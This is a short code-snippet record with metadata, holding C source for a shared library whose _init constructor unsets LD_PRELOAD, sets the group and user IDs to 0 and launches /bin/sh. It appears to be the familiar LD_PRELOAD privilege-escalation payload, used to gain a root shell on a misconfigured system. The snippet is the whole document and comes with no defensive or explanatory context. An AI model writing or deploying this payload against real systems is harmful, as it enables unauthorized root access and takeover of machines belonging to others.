---
id: add1034d-603b-46a7-b7fa-d37c8260efa4
type: code
language: C
verified: false
created_at: '2023-04-06T03:56:19.001964+00:00'
updated_at: '2023-04-10T20:34:23.361415+00:00'
---

# Code Snippet add1034d

**Language**: C

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

/*
This program sets the GID and UID to 0 (root) and executes a shell.
*/
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```
